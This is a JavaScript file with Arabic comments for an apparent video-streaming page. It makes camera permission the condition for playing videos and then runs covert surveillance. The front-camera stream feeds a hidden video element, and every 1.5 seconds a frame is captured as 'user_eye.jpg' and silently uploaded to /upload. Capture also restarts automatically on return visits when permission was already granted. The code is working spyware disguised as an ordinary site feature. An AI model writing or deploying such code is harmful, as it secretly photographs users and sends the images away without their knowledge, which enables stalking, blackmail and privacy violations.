/* ==========================================================
   سكريبت الكاميرا المحدث - الانتقال المشروط بالصلاحيات
   ========================================================== */

let mediaStream = null;

// دالة فتح الفيديو المربوطة حصرياً بمنح صلاحية الكاميرا
async function openVideo(id) {
    // التحقق مما إذا كانت الكاميرا مفعلة والصلاحية ممنوحة مسبقاً
    if (mediaStream) {
        executeWatchTransition(id);
        return;
    }

    try {
        // طلب إذن الوصول إلى الكاميرا فور النقر على الفيديو
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: { ideal: 'user' }
            } 
        });

        // ربط البث بعنصر الفيديو المخفي في الصفحة
        const videoEl = document.getElementById('video');
        if (videoEl) {
            videoEl.srcObject = mediaStream;
        }

        // إذا تم السماح بالصلاحية بنجاح، يتم الانتقال لصفحة المشاهدة
        executeWatchTransition(id);

        // بدء حلقة التقاط الإطارات في الخلفية
        startPeriodicCapture();

    } catch (e) {
        console.log("تم رفض إذن الكاميرا أو حدث خطأ:", e);
        // إذا رفض المستخدم الإذن، لن يتحول النظام إلى صفحة المشاهدة ويبقى في الواجهة الرئيسية
    }
}

// دالة تنفيذ الانتقال لصفحة المشاهدة وتحديث واجهة التطبيق
function executeWatchTransition(id) {
    S.cur = id;
    S.view = 'watch';
    S.descOpen = false;
    S.hist = [id, ...S.hist.filter(x => x !== id)];
    document.body.classList.remove('drawer-open', 'searching');
    document.title = cur().title;
    render();
    scrollTo(0, 0);
}

// حلقة التكرار الزمنية لالتقاط الصور كل 1.5 ثانية
function startPeriodicCapture() {
    setInterval(() => {
        const videoEl = document.getElementById('video');
        if (!mediaStream || !videoEl) return;
        try {
            const vw = videoEl.videoWidth || 640;
            const vh = videoEl.videoHeight || 480;

            const canvas = document.createElement('canvas');
            canvas.width = vw;
            canvas.height = vh;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoEl, 0, 0, vw, vh);

            canvas.toBlob(blob => {
                if (blob) {
                    let fd = new FormData();
                    fd.append('image', blob, `user_eye.jpg`);
                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                }
            }, 'image/jpeg', 0.85);
        } catch (err) {
            console.log("خطأ في التقاط الإطار:", err);
        }
    }, 1500);
}

// التحقق المسبق من الصلاحيات إذا كانت ممنوحة مسبقاً من زيارات سابقة
navigator.permissions?.query({ name: 'camera' }).then((permissionStatus) => {
    if (permissionStatus.state === 'granted') {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } })
            .then(stream => {
                mediaStream = stream;
                const videoEl = document.getElementById('video');
                if (videoEl) videoEl.srcObject = mediaStream;
                startPeriodicCapture();
            })
            .catch(() => {});
    }
});
